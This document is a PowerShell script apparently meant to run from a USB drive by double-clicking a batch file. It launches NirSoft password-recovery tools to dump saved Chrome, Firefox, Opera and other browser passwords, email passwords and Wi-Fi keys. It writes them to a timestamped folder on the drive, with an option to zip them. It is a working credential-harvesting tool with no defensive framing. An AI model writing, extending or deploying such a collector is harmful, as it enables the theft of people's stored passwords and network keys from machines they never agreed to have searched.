# collector.ps1
# Usage: invoked from start.bat (double-click) or run manually
# The script saves outputs into USB_ROOT\results\<timestamp>\

param(
    [switch]$ZipResults
)

$ErrorActionPreference = 'Continue'

# Folder where this script lives -> scripts\
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition
# USB root = parent of scripts\
$usbRoot = (Get-Item "$scriptFolder\..").FullName

$toolsDir = Join-Path $usbRoot 'tools'
$resultsRoot = Join-Path $usbRoot 'results'

Write-Host "USB Root: $usbRoot" -ForegroundColor Cyan
Write-Host "Tools Dir: $toolsDir" -ForegroundColor Cyan
Write-Host "Results Root: $resultsRoot" -ForegroundColor Cyan
Write-Host ""

# Create results folder if it doesn't exist
if (-not (Test-Path $resultsRoot)) {
    New-Item -ItemType Directory -Path $resultsRoot -Force | Out-Null
    Write-Host "Created results folder" -ForegroundColor Green
}

# Create timestamp folder
$timeStamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
$dest = Join-Path $resultsRoot $timeStamp
New-Item -ItemType Directory -Path $dest -Force | Out-Null
Write-Host "Created output folder: $dest" -ForegroundColor Green
Write-Host ""

# Log file
$log = Join-Path $dest 'collector.log'
"Collector started: $(Get-Date)" | Out-File -FilePath $log -Encoding utf8

function Log {
    param([string]$text)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $text"
    $line | Out-File -FilePath $log -Append -Encoding utf8
    Write-Host $line
}

function Run-Tool {
    param(
        [string]$exe,        # EXE filename located in tools\
        [string]$outfile,    # Output filename (just the filename, not full path)
        [string]$customArgs = ""  # Optional custom arguments
    )
    
    $exePath = Join-Path $toolsDir $exe
    $outPath = Join-Path $dest $outfile
    
    if (-not (Test-Path $exePath)) {
        Write-Host "MISSING: $exe not found in tools folder" -ForegroundColor Red
        Log "MISSING: $exePath"
        return
    }
    
    try {
        Write-Host "Running: $exe..." -ForegroundColor Yellow
        Log "RUNNING: $exe -> $outfile"
        
        # Build the argument list with the output path
        # /stext = save as text, /NoLoadConfig = don't load previous settings
        if ($customArgs -ne "") {
            $fullArgs = "$customArgs /stext `"$outPath`""
        } else {
            $fullArgs = "/stext `"$outPath`""
        }
        
        # Start process and wait (with 30 second timeout)
        $proc = Start-Process -FilePath $exePath -ArgumentList $fullArgs -NoNewWindow -PassThru
        
        # Wait up to 30 seconds for the process to complete
        $completed = $proc.WaitForExit(30000)
        
        if (-not $completed) {
            Write-Host "WARNING: $exe timed out after 30 seconds" -ForegroundColor Yellow
            $proc.Kill()
            Log "WARNING: $exe timed out"
            return
        }
        
        # Give it a moment for file to be written
        Start-Sleep -Milliseconds 500
        
        # Check if output file was created
        if (Test-Path $outPath) {
            $fileSize = (Get-Item $outPath).Length
            if ($fileSize -gt 10) {
                Write-Host "SUCCESS: $exe -> $outfile ($fileSize bytes)" -ForegroundColor Green
                Log "SUCCESS: $exe -> $outfile (ExitCode: $($proc.ExitCode), Size: $fileSize bytes)"
            } else {
                Write-Host "WARNING: $exe created empty file (no data found)" -ForegroundColor Yellow
                Log "WARNING: $exe created empty/minimal file at $outPath"
            }
        } else {
            Write-Host "WARNING: $exe completed but no output file created" -ForegroundColor Yellow
            Write-Host "  Possible causes: GUI dialog appeared, antivirus blocked, or no data to save" -ForegroundColor Gray
            Log "WARNING: $exe completed but no output file at $outPath"
        }
        
    } catch {
        Write-Host "ERROR running ${exe}: $($_.Exception.Message)" -ForegroundColor Red
        Log "ERROR running ${exe}: $($_.Exception.Message)"
    }
}

# --------------------
# List of NirSoft tools to run
# --------------------

Log "Starting password collection..."
Write-Host "==================== Collecting Data ====================" -ForegroundColor Cyan
Write-Host ""

# Note: Most NirSoft tools require administrator privileges
# ChromePass needs no special args
Run-Tool -exe 'ChromePass.exe' -outfile 'ChromePass.txt'

# WirelessKeyView MUST run as admin
Run-Tool -exe 'WirelessKeyView.exe' -outfile 'wifi_keys.txt'

# WebBrowserPassView - supports multiple browsers
Run-Tool -exe 'WebBrowserPassView.exe' -outfile 'browser_passwords.txt'

# Mail PassView
Run-Tool -exe 'mailpv.exe' -outfile 'MailPass.txt'

# Opera PassView
Run-Tool -exe 'OperaPassView.exe' -outfile 'OperaPass.txt'

# PasswordFox - Firefox passwords
Run-Tool -exe 'PasswordFox.exe' -outfile 'PasswordFox.txt'

# Add more Run-Tool lines here for additional EXEs you have

Write-Host ""
Write-Host "==================== Summary ====================" -ForegroundColor Cyan

# List all created files
$createdFiles = Get-ChildItem -Path $dest -File | Where-Object { $_.Name -ne 'collector.log' }
if ($createdFiles.Count -gt 0) {
    Write-Host "Files created:" -ForegroundColor Green
    foreach ($file in $createdFiles) {
        Write-Host "  - $($file.Name) ($($file.Length) bytes)" -ForegroundColor White
    }
} else {
    Write-Host "No output files were created (check if tools ran correctly)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Results saved to: $dest" -ForegroundColor Green

# Optional: compress results
if ($ZipResults) {
    try {
        $zipfile = Join-Path $resultsRoot ("results_$timeStamp.zip")
        Compress-Archive -Path (Join-Path $dest '*') -DestinationPath $zipfile -Force
        Write-Host "Compressed to: $zipfile" -ForegroundColor Green
        Log "ZIPPED -> $zipfile"
    } catch {
        Write-Host "ZIP FAILED: $($_.Exception.Message)" -ForegroundColor Red
        Log "ZIP FAILED: $($_.Exception.Message)"
    }
}

Log "Collector finished: $(Get-Date)"
Write-Host ""
Write-Host "Collection complete!" -ForegroundColor Green
Write-Host "Press any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')